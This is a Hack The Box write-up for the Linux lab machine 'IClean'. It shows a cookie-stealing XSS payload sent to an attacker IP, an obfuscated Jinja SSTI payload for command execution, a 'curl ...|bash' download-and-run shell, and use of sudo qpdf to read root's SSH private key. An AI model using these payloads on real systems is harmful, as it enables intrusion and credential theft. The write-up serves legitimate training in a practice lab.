---
title: "IClean"
---

# IClean

![Cap dashboard screenshot](iclean.png)

IClean is a medium Linux Hack The Box machine that starts with an XSS on a quote request form, then uses SSTI to gain code execution, and ends with root through `qpdf` abuse.

## Reconnaissance

I started with an Nmap scan of the target.

```bash
nmap -sC -sV -oA nmap/output 10.129.254.104
```

The scan showed SSH and HTTP:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.52 (Ubuntu)
```

I focused on HTTP first.

## Web Access

Browsing to the site redirected to `capiclean.htb`, so I added that to my hosts file and refreshed the page. The site advertised a house cleaning service and exposed a quote request form at `/quote`.

![Cap dashboard screenshot](iclean-1.png)

The quote form accepted a set of services and an email address. Since the request looked like something a staff member might review, I tested it for XSS.

I sent a request with a malicious service parameter:

```html
<img src=x onerror='document.location="http://10.10.10.10/" + document.cookie'>
```

The modified request looked like this:

```http
POST /sendMessage HTTP/1.1
Host: capiclean.htb

service=<img+src%3dx+onerror%3d'document.location%3d"http%3a//10.10.10.10/"+%2b+document.cookie'>&email=ryuki%40capiclean.htb
```

A callback came back to my web server with a session cookie.

```text
GET /session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zqvgag.RE8mq5P2D-ZRz5c7V7xkTBvLZDs
```

Using the stolen cookie, I found hidden directories on the web server.

```bash
ffuf -s -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://capiclean.htb/FUZZ
```

That showed:

```text
logout
login
about
services
dashboard
team
quote
server-status
```

The `dashboard` page became accessible with the stolen cookie.

![Cap dashboard screenshot](iclean-2.png)

## Admin Dashboard

The dashboard exposed several features:

- Generate Invoice.
- Generate QR.
- Edit Services.
- Quote Requests.

I generated an invoice and then used the invoice ID in the QR generation feature. The result produced a scannable invoice with the QR code in the lower right corner.

![Cap dashboard screenshot](iclean-3.png)

When I swapped the QR field for a Jinja-style payload, it rendered output from the template, confirming SSTI.

A simple test worked:

```text
{{ 7 * 7 }}
```

![Cap dashboard screenshot](iclean-4.png)

That returned `49`.

For command execution, I used a more obfuscated payload that called `id`:

```text
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

![Cap dashboard screenshot](iclean-5.png)

That gave command output inside the invoice.

To get a shell, I placed a reverse shell command in a local file and served it over HTTP. Then I replaced the `id` command with:

```text
curl 10.10.10.10/shell|bash
```

That gave me a shell as `www-data`.

## Database Access

The application had hardcoded database credentials in `/opt/app/app.py`.

```python
db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'pxCsmnGLckUb',
    'database': 'capiclean'
}
```

I logged into MySQL using those credentials.

```bash
mysql -u iclean -D capiclean -p
```

The database had three tables:

```text
quote_requests
services
users
```

The `users` table contained two users and SHA256-looking password hashes.

```text
+----+----------+------------------------------------------------------------------+----------------------------------+
| id | username | password                                                         | role_id                          |
+----+----------+------------------------------------------------------------------+----------------------------------+
|  1 | admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 | 21232f297a57a5a743894a0e4a801fc3 |
|  2 | consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa | ee11cbb19052e40b07aac0ca060c23ee |
```

I cracked the `consuela` hash and got:

```text
simple and clean
```

That password worked for the `consuela` user.

## Shell as Consuela

With `consuela`, I checked the mailbox and found an email about weird PDFs.

```text
To: <consuela@capiclean.htb>
Subject: Issues with PDFs
From: management <management@capiclean.htb>
```

The message suggested the PDF generation path was important. I also checked sudo permissions and found that `consuela` could run `qpdf` as any user.

## Root Access

`qpdf` can modify and inspect PDFs in ways that are useful for privilege escalation. I used it to attach `/root/.ssh/id_rsa` to a blank PDF and keep the content readable by using `--qdf`.

```bash
sudo /usr/bin/qpdf --empty /tmp/ssh.pdf --qdf --add-attachment /root/.ssh/id_rsa --
```

Then I read the PDF output and recovered the root SSH private key.

```text
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

With that key, I logged in as root and collected the final flag.

## Attack Path

- Enumerate services and find HTTP plus SSH.
- Discover `capiclean.htb` and test the quote form.
- Exploit XSS to steal a session cookie.
- Access the hidden dashboard.
- Abuse SSTI in invoice generation.
- Gain a shell as `www-data`.
- Read database credentials from the application.
- Crack the `consuela` password hash.
- Use `qpdf` sudo access to exfiltrate `/root/.ssh/id_rsa`.
- SSH as root.
